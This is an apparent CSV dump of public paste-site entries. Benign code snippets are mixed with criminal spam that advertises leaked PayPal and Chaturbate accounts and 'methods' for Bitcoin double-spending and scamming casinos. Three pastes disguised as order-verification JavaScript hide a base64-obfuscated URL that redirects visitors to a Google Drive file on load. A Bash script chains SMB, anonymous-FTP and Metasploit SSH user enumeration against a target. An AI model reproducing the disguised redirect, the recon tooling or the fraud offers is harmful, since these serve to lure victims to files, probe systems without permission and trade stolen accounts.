id,title,username,language,date,content
SJxRdQsD,Doublespending using Vanity Wallet,Epiphemeral,JavaScript,Sunday 4th of May 2025 12:23:59 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 43122
sDGyfuUh,Make $1000 15-MINUTES  (BEGINNER) YR,luvstxtic,JavaScript,Sunday 4th of May 2025 12:20:23 PM CDT," 
Pdf https://tinyurl.com/freshleaks

YG0Osntcch
"
TQDX34Wp,Untitled,RTS_Dmitriy,Lua,Sunday 4th of May 2025 12:20:01 PM CDT,"print('Enter the password: ')

pass = read()

if pass == 'abc123' then
    print('Welcome')
end"
ZrmbvCJp,Untitled,bendas,Bash,Sunday 4th of May 2025 12:17:59 PM CDT,"#!/bin/bash
echo ""Please enter the target IP Address""
read target
users=""root,kali,admin,msfadmin""
while true; do
echo ""Please choose a number""
echo ""1) List shared folders""
echo ""2) Checks anonymous ftp login""
echo ""3) Check login via SSH""
echo ""4) Secret Key!! DONT SELECT""
echo ""5) Exit""
read choose
case $choose in 
1)
smbclient -L //$target// -N
;;
2)
nmap -p 21 --script ftp-anon $target | grep ""Anonymous FTP login allowed"" 
if [ $? -eq 0 ]; then
echo ""Anonymous user allowed""
    else
echo ""Anonymous user isn't allowed""
fi
;;
3)
echo -e ""root\nkali\nadmin\nmsfadmin"" > users_check.txt
msfconsole -q -x ""use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS 192.168.24.131; set USER_FILE users_check.txt; run; exit""
;;
4) 
echo -e ""It's a secret key, can you guess what? \e[32mQWRvbmlzIEdheQo=\e[0m""
exit
;;
5)
exit
;;
*)
echo ""Invalid""
;;
esac
done"
0hT4e6SE,Untitled,ItzSaf,Python,Sunday 4th of May 2025 12:16:58 PM CDT,"            try:
                current_api_key = input_api_key if input_api_key else api_key
                # Build a prompt
                time_prompt = """"
                if st.session_state.time != ""Any"":
                    time_prompt = f""The meal should be prepared in {st.sessions_state.time}""
                complexity = """"
                if st.session_state.complexity != ""Any"":
                    complexity = f""The recipe should be {st.session_state.complexity} difficulty.""
                
                cuisine = """"
                if st.session_state.cuisine != ""Any"":
                    cuisine = f""I prefer {st.session_state.cuisine} cuisine if possible.""
                
                dietary = """"
                if st.session_state.dietary_restrictions:
                    dietary = f""I have the following dietary restrictions: {', '.join(st.session_state.dietary_restrictions)}.""
                
                prompt = f""""""
                I have the following ingredients: {', '.join(selected_ingredients)}.
                
                Can you suggest 3-5 different meals I could make? {time_constraint} {complexity} {cuisine} {dietary}
                
                For each recipe, please provide:
                1. Recipe name
                2. Brief description
                3. Preparation time
                4. Difficulty level (Easy, Medium, Hard)
                5. List of ingredients with measurements
                6. Step by step instructions
                7. Any missing key ingredients I should add
                
                Format the response as a JSON array with the following structure:
                [
                    {{
                        ""name"": ""Recipe Name"",
                        ""description"": ""Brief description"",
                        ""prep_time"": ""30 minutes"",
                        ""difficulty"": ""Easy"",
                        ""ingredients"": [""1 cup ingredient1"", ""2 tbsp ingredient2""],
                        ""instructions"": [""Step 1 description"", ""Step 2 description""],
                        ""missing_ingredients"": [""ingredient1"", ""ingredient2""]
                    }}
                ]
                
                Only respond with the JSON array and nothing else.
                """"""
"
D5Qk8n7y,EARN $900 INSTANTLY 2025 95,luvstxtic,JavaScript,Sunday 4th of May 2025 12:11:10 PM CDT," 
Pdf https://tinyurl.com/freshleaks

hyKYNodbce
"
h8Ef2wfM,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Sunday 4th of May 2025 12:09:29 PM CDT,18066 Accounts Posted On https://t.me/leakzbyeminem
hLmXjuDw,Untitled,dentira,JavaScript,Sunday 4th of May 2025 12:08:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65283/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mcQm3jZ3,Abuse RBF in BTC transactions,Epiphemeral,JavaScript,Sunday 4th of May 2025 12:08:37 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 60226
BvB0nnGq,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Sunday 4th of May 2025 11:54:07 AM CDT,49831 Accounts Posted On https://t.me/leakzbyeminem
Fqb5EKER,Products.js,dentira,JavaScript,Sunday 4th of May 2025 11:53:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16554/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xbapQSEQ,Stake Free Balance Method,Epiphemeral,JavaScript,Sunday 4th of May 2025 11:53:15 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 41550
QqQBnATX,bobot,kura2yamato,JavaScript,Sunday 4th of May 2025 11:50:52 AM CDT,"/*script dinamic003.js */
jq112(function($) {/*tidak disarankan*/
    jq112(document).on({/*chShow*/
        click: function() {
            checkInfo( );
            if ($(this).is("":checked"")){ 
                objDiv = $(this).parent().find(""div"");
                showLog( objDiv);
                objDiv.removeClass('hide');
                showLog(""checked"");
            }else{
                objDiv = $(this).parent().find(""div"");
                objInput = $(this).parent().find("".inpBobot"");

                objInput.val(0);
                objDiv.addClass('hide');
                showLog(""not checked"");
            }

      }
    }, "".chShow"");
    
    jq112(document).on({//.inpBobot
        change: function() {
            checkInfo(this);
        }

    }, "".inpBobot"");    
});

function checkInfo(obj){
    maxNum=100;
    numActive=0; 
    jq112(""#btnSimpan"").removeClass(""btnWarning"");
    try {
        numChange= parseInt( jq112(obj).val() );
    }catch(err) {    
        numChange =0;
    }
    iCheck=0;
    minCheck=3;
    maxCheck=5;
    jq112( "".inpBobot"" ).each(function() {
      numActive += parseInt( jq112(this).val() );
      jq112(this).removeClass(""redBorder"");     
    });

    jq112( "".chShow"" ).each(function() {
        if (jq112(this).is("":checked"")){
          iCheck++;
        }
    });
 
    if(iCheck < minCheck){
        nodeWrite(""infoBobot"", ""Masukkan minimal ""+minCheck+"" input<br/>"",1);
        jq112(""#btnSimpan"").addClass(""btnWarning"");
    }else if(iCheck > maxCheck){
        nodeWrite(""infoBobot"", ""Masukkan maximal ""+maxCheck+"" input<br/>"",1);
        jq112(""#btnSimpan"").addClass(""btnWarning"");
    }else{
        nodeWrite(""infoBobot"", """",1);
    }
    //nodeWrite(""infoBobot"", ""Anda menginput:""+iCheck );

    if(numActive > maxNum){
        nodeWrite(""infoBobot"", ""Nilai Bobot :""+numActive+""\nBatas Maximal:""+maxNum   );
        nodeWrite(""infoBobot"", ""<br/>silahkan di review kembali:""+ numInput);
        numInput = maxNum - (numActive - numChange);
        jq112(this).val( numInput ).addClass(""redBorder"");
        jq112(""#btnSimpan"").addClass(""btnWarning"");
        //alert(""Nilai Bobot :""+numActive+""\nBatas Maximal:""+maxNum);
    }else if(numActive < maxNum){
        nodeWrite(""infoBobot"", ""Nilai Bobot terinput:""+numActive );
        numInput = maxNum - (numActive);
        if(numInput!=0){
            nodeWrite(""infoBobot"", ""<br/>Bobot yang dapat di input:""+ numInput);
        }
        showLog([numActive,maxNum]);
        jq112(""#btnSimpan"").addClass(""btnWarning"");
    }else if(numActive < maxNum){
        nodeWrite(""infoBobot"", ""<br/>Bobot dapat diproses"" );
    }
    return ;
}

function showLog( objLog ){
    try {
        //console.log( objLog );
    }
    catch(err) {    
    /*console.log not work here*/
    }
    return ;
}//function showLog()

function nodeWrite(objName, content, clean){
    let element = document.getElementById(objName);
    if(clean){
        while ( element.lastChild ) {
            element.removeChild( element.lastChild );
        }
    }

    element.insertAdjacentHTML( ""beforeend"", content );
    return ;
}"
mEpq8mzZ,Untitled,LocalSt0arge,Bash,Sunday 4th of May 2025 11:42:25 AM CDT,"curl -o anydesk.deb https://download.anydesk.com/linux/anydesk_6.4.3-1_amd64.deb && sudo apt install ./anydesk.deb
"
RuTwSBRQ,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Sunday 4th of May 2025 11:38:45 AM CDT,72154 Accounts Posted On https://t.me/leakzbyeminem
JH6V1wKp,Order.js,dentira,JavaScript,Sunday 4th of May 2025 11:37:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79432/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ygJstghW,Scam Casinos and Stores,Epiphemeral,JavaScript,Sunday 4th of May 2025 11:37:52 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 67090
aNTHx6PM,Fall damage,TotallyGames,Lua,Sunday 4th of May 2025 11:34:33 AM CDT,"game.Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function(character)
		local humanoid = character:WaitForChild(""Humanoid"")
		local rootPart = character:WaitForChild(""HumanoidRootPart"")

		local highestPoint = rootPart.Position.Y
		local wasInAir = false

		game:GetService(""RunService"").Heartbeat:Connect(function()
			if humanoid.Health <= 0 then return end

			local currentY = rootPart.Position.Y
			local isInAir = humanoid.FloorMaterial == Enum.Material.Air

			if isInAir then
				if currentY > highestPoint then
					highestPoint = currentY
				end
				wasInAir = true
			elseif wasInAir then
				local fallDistance = highestPoint - currentY
				if fallDistance > 15 then
					local damage = math.floor((fallDistance - 15)^1.2)
					humanoid:TakeDamage(damage)
				end
				highestPoint = currentY
				wasInAir = false
			end
		end)
	end)
end)
"
